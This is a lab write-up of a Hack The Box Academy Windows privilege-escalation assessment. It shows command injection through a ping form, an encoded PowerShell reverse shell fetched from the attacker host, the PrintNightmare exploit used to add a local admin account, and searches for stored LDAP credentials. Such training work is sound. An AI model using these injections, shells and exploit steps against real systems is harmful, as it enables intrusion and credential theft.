---
title: HTB Academy | Windows Privilege Escalation Skills Assessment I
date: 2023-08-01 18:55:00 -0500
categories: [Writeups, HTB]
tags: [pentest, htb, attack, windows, privilege]
---

## Challenge

During a penetration test against the INLANEFREIGHT organization, you encounter a non-domain joined Windows server host that suffers from an unpatched command injection vulnerability. After gaining a foothold, you come across credentials that may be useful for lateral movement later in the assessment and uncover another flaw that can be leveraged to escalate privileges on the target host.

For this assessment, assume that your client has a relatively mature patch/vulnerability management program but is understaffed and unaware of many of the best practices around configuration management, which could leave a host open to privilege escalation.

Enumerate the host (starting with an Nmap port scan to identify accessible ports/services), leverage the command injection flaw to gain reverse shell access, escalate privileges to NT AUTHORITY\SYSTEM level or similar access, and answer the questions below to complete this portion of the assessment.

- Which two KBs are installed on the target system? (Answer format: 3210000&3210060) 
- Find the password for the ldapadmin account somewhere on the system. 
- Escalate privileges and submit the contents of the flag.txt file on the Administrator Desktop. 
- After escalating privileges, locate a file named confidential.txt. Submit the contents of this file. 

## Our Host
`10.10.14.30`

## Target
`10.129.143.15`

## Enumeration

Performed NMAP scan on the target.
```bash
$ sudo nmap 10.129.143.15 -Pnp -A
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-01 17:12 BST
Nmap scan report for 10.129.143.15
Host is up (0.0071s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: DEV Connection Tester
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WINLPE-SKILLS1-SRV
| Not valid before: 2023-07-31T15:26:14
|_Not valid after:  2024-01-30T15:26:14
|_ssl-date: 2023-08-01T16:12:56+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINLPE-SKILLS1-
|   NetBIOS_Domain_Name: WINLPE-SKILLS1-
|   NetBIOS_Computer_Name: WINLPE-SKILLS1-
|   DNS_Domain_Name: WINLPE-SKILLS1-SRV
|   DNS_Computer_Name: WINLPE-SKILLS1-SRV
|   Product_Version: 10.0.14393
|_  System_Time: 2023-08-01T16:12:51+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2016 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   12.58 ms 10.10.14.1
2   11.91 ms 10.129.143.15

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.48 seconds
```
RDP protocol was opened. However, we did not have initial credentials. Browsed to HTTP web page, we saw a ping utility with a text entry field and a submit button. We could try to input our injection command:
```bash
ping 127.0.0.1|whoami
```
We got the output showing `iis apppool\defaultapppool`. This confirmed the page was vulnerable to command injection.
Then we could inject our shellcode.
```bash
127.0.0.1|powershell -e JABjAGwAaQBlAG4AdAAgA..<SNIP>...
```
Now we gained a restricted reverse shell. We could run `systeminfo` to gain the details of the OS.
```powershell
PS C:\windows\system32\inetsrv> systeminfo

Host Name:                 WINLPE-SKILLS1-
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00376-30821-30176-AA757
Original Install Date:     5/25/2021, 8:57:43 PM
System Boot Time:          8/1/2023, 8:26:00 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 3,179 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 3,899 MB
Virtual Memory: In Use:    900 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 2 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB3200970
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.143.15
                                 [02]: fe80::5da6:b6ab:3cd4:84fb
                                 [03]: dead:beef::5da6:b6ab:3cd4:84fb
                                 [04]: dead:beef::85
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
We knew that the OS version was 10.0.14393, and patched with KB3199986 and KB3200970.

## Privilege Escalation

There were several exploits we could use. Here we use [CVE-2021-1675 - PrintNightmare LPE (PowerShell)](https://github.com/calebstewart/CVE-2021-1675). Downloaded the `ps1` script on the target.
```powershell
PS C:\users\public\download> wget -Uri http://10.10.14.30:8000/CVE-2021-1675.ps1 -UseBasicParsing -outfile CVE-2021-1675.ps1
```
We could the script to create new account `adm1n`/`P@ssw0rd` in the local admin group.
```powershell
PS C:\users\public\download> Import-Module .\cve-2021-1675.ps1
PS C:\users\public\download> Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` 
```

## Search Credentials
Performed RDP with this new admin account. We then could start search for the credentials.
Searched for `ldapadmin` string on the text file.
```cmd
c:\Users>findstr /SIM /C:"ldapadmin" *.txt *.ini *.cfg *.config *.xml
Administrator\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml
Administrator\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.ui\dialog_settings.xml
htb-student\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml
htb-student\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml-temp
htb-student\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.ui\dialog_settings.xml
```
Opened the first `connections.xml`, we got the password for the `ldapadmin` account.
```xml
<?xml version="1.0" encoding="UTF-8"?>

<connections>
  <connection id="21f81b55-9e67-4f2a-b9e7-1939d662f017" name="LDAP.inlanefreight.local" host="dc01.inlanefreight.local" port="389" encryptionMethod="NONE" authMethod="SIMPLE" bindPrincipal="ldapadmin" bindPassword="XX...X" saslRealm="" saslQop="AUTH" saslSecStrenght="HIGH" saslMutualAuth="false" krb5CredentialsConf="USE_NATIVE" krb5Config="DEFAULT" krb5ConfigFile="" krb5Realm="" krb5KdcHost="" krb5KdcPort="88" readOnly="false" timeout="30000">
   ...<SNIP>...
```
Then searched for `confidential.txt`:
```cmd
c:\Users>dir /s confidential.txt
 Volume in drive C has no label.
 Volume Serial Number is 7029-F417

 Directory of c:\Users\Administrator\Music

06/07/2021  12:41 PM                32 confidential.txt
               1 File(s)             32 bytes

     Total Files Listed:
               1 File(s)             32 bytes
               0 Dir(s)  18,834,948,096 bytes free
```

## References

https://academy.hackthebox.com/module/67/section/637

https://github.com/calebstewart/CVE-2021-1675
